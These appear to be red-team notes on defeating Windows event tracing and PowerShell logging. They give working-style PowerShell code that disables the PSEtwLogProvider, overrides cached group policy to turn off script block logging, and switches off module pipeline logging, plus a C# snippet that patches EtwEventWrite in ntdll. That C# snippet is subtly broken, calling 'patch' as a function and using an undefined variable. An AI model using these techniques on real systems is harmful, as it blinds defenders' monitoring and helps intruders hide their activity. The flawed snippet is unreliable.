Simple, but uneffective, evasion
- Deleting, Clearing and Halting Logging

Event Count

	Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count

## ETW Components explained

"From start to finish, events originate from the **providers**. **Controllers** will determine where the data is sent and how it is processed through sessions. **Consumers** will save or deliver logs to be interpreted or analyzed."

## Techniques that target each ETW component.

**Provider**
- PSEtwLogProvider Modification
- Group Policy Takeover
- Log Pipeline Abuse
- Type Creation

**Controller**
 - Patching EtwEventWrite
 - Runtime Tracing Tampering, 

**Consumers**
- Log Smashing, Log Tampering


## Provider
#### PSEtwLogProvider Modification

```
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

#### GPO Bypass
```
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

Powershell v5.1 compliant
```
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

#### Abusing Log Pipeline
Disable module logging of currently imported modules.

```
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```

## Controller

#### EtwEventWrite

C# code

```
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");

uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);

patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);

Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```
